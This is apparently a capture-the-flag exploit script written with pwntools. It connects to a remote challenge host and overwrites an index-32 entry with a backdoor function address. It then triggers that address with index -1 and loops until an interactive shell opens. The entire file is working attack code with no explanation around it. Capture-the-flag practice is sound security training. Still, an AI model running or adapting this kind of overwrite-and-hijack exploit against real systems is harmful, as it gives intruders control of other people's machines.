from pwn import *

context(log_level='debug',arch='amd64',os='linux')

filename = './pwn'


def debug():
	gdb.attach(io,"b *0x401270")

def pwn1(index,name,id_):
	io.sendlineafter("index\n",str(index))
	io.sendafter("name:",name)
	io.sendlineafter("id:\n",str(id_))
	
def pwn2():
	io.sendlineafter("index\n","-1")

backdoor = 0x401323
while(1):
	try:
		#io = process(filename)
		io = remote("xyctf.top",60321)
		
		#for i in range(0,33):
			#pwn1(i,p64(backdoor)*2,0x00)
		pwn1(32,p64(backdoor)*2,0x38)
		#debug()
		pwn2()
		io.recvuntil("Have a good time!\n")
		data = io.recv()
		io.interactive()
		break
	except EOFError:
		io.close()
		continue





